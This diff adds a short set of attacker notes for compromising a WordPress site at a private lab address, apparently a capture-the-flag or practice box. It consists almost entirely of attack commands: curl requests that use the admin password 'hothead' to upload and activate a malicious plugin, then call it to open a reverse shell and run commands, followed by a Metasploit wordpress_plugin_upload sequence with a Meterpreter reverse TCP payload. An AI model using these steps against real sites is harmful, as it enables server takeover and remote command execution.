@@ -1,0 +1,20 @@
+curl -u admin:hothead -F "pluginzip=@malicious.zip" http://192.168.56.104/blog/wp-admin/plugin-install.php?action=upload
+
+curl -u admin:hothead http://192.168.56.104/blog/wp-admin/plugins.php?action=activate&plugin=malicious/malicious.php
+
+triger 
+
+curl http://192.168.56.104/blog/wp-content/plugins/malicious/malicious.php?revshell
+
+curl http://192.168.56.104/blog/wp-content/plugins/malicious/malicious.php?cmd=whoami
+
+
+msf6 > use exploit/multi/http/wordpress_plugin_upload
+msf6 exploit(multi/http/wordpress_plugin_upload) > set RHOSTS <target_IP>
+msf6 exploit(multi/http/wordpress_plugin_upload) > set TARGETURI /blog/
+msf6 exploit(multi/http/wordpress_plugin_upload) > set USERNAME <admin_username>
+msf6 exploit(multi/http/wordpress_plugin_upload) > set PASSWORD <admin_password>
+msf6 exploit(multi/http/wordpress_plugin_upload) > set LHOST <your_attacking_machine_IP>
+msf6 exploit(multi/http/wordpress_plugin_upload) > set LPORT 4444
+msf6 exploit(multi/http/wordpress_plugin_upload) > set PAYLOAD php/meterpreter_reverse_tcp
+msf6 exploit(multi/http/wordpress_plugin_upload) > exploit
